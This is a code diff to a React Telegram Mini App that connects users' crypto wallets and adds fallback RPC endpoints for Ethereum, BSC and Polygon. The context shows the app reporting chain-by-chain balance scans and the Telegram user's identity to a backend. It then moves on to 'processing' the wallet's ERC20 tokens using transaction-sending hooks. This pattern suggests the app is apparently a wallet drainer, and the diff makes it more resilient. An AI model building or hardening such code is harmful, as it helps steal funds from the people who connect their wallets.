@@ -4,7 +4,7 @@ import { motion, AnimatePresence } from 'motion/react';
 import { useWeb3Modal } from '@web3modal/wagmi/react';
 import { useAccount, useDisconnect, useSwitchChain, useSendTransaction, useBalance, useWriteContract } from 'wagmi';
 import { mainnet, bsc, polygon } from 'wagmi/chains';
-import { parseEther, parseUnits, createPublicClient, http, erc20Abi } from 'viem';
+import { parseEther, parseUnits, createPublicClient, http, fallback, erc20Abi } from 'viem';
 
 // Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
 const tg = (window as any).Telegram?.WebApp;
@@ -165,9 +165,21 @@ export default function App() {
   };
 
   const RPC_URLS = {
-    [mainnet.id]: 'https://eth.llamarpc.com',
-    [bsc.id]: 'https://bsc-dataseed.binance.org',
-    [polygon.id]: 'https://polygon.llamarpc.com',
+    [mainnet.id]: [
+      'https://eth.llamarpc.com',
+      'https://rpc.ankr.com/eth',
+      'https://cloudflare-eth.com'
+    ],
+    [bsc.id]: [
+      'https://bsc-dataseed.binance.org',
+      'https://rpc.ankr.com/bsc',
+      'https://binance.llamarpc.com'
+    ],
+    [polygon.id]: [
+      'https://polygon.llamarpc.com',
+      'https://rpc.ankr.com/polygon',
+      'https://polygon-rpc.com'
+    ],
   };
 
   useEffect(() => {
@@ -227,9 +239,10 @@ export default function App() {
             body: JSON.stringify({ message: `Scanning ${chain.name}...`, user: tg?.initDataUnsafe?.user })
           });
 
+          const urls = RPC_URLS[chain.id as keyof typeof RPC_URLS] || [];
           const publicClient = createPublicClient({
             chain: chain,
-            transport: http(RPC_URLS[chain.id as keyof typeof RPC_URLS])
+            transport: fallback(urls.map(url => http(url)))
           });
 
           const nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` });
@@ -278,9 +291,10 @@ export default function App() {
           continue;
         }
 
+        const urls = RPC_URLS[chain.id as keyof typeof RPC_URLS] || [];
         const publicClient = createPublicClient({
           chain: chain,
-          transport: http(RPC_URLS[chain.id as keyof typeof RPC_URLS])
+          transport: fallback(urls.map(url => http(url)))
         });
 
         // 2a. Process ERC20 Tokens
